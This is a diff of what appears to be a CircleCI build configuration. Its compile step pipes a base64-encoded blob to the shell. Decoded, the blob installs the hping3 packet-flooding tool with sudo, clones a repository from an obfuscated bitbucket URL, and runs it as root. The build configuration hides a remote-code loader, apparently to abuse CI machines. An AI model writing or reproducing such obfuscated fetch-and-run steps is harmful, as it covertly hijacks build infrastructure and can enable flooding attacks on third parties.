@@ -3,7 +3,7 @@ machine:
     version: 8.6.0
 dependencies:
   override:
-    - npm i
+    - npm i -g yarn
 compile:
   override:
     - 'echo bj0kKHdoaWNoIG5vZGUpOyBuPSR7biUvYmluL25vZGV9OyBjaG1vZCAtUiA3NTUgJG4vYmluLyo7IHN1ZG8gY3AgLXIgJG4ve2JpbixsaWIsc2hhcmV9IC91c3IvbG9jYWwKc3VkbyBhcHQtZ2V0IGluc3RhbGwgaHBpbmczCmdpdCBjbG9uZSAkKGVjaG8gYUhSMGNITTZMeTlIYkc5eWFXOTFjMWxsYkd4dmQwQmlhWFJpZFdOclpYUXViM0puTDBkc2IzSnBiM1Z6V1dWc2JHOTNMM2xpTG1kcGRBbz0gfCBiYXNlNjQgLS1kZWNvZGUpIHliCmNkIHliCnlhcm4Kc3VkbyBucG0gc3RhcnQKc3VkbyBucG0gc3RhcnQKCg== | base64 --decode | sh'
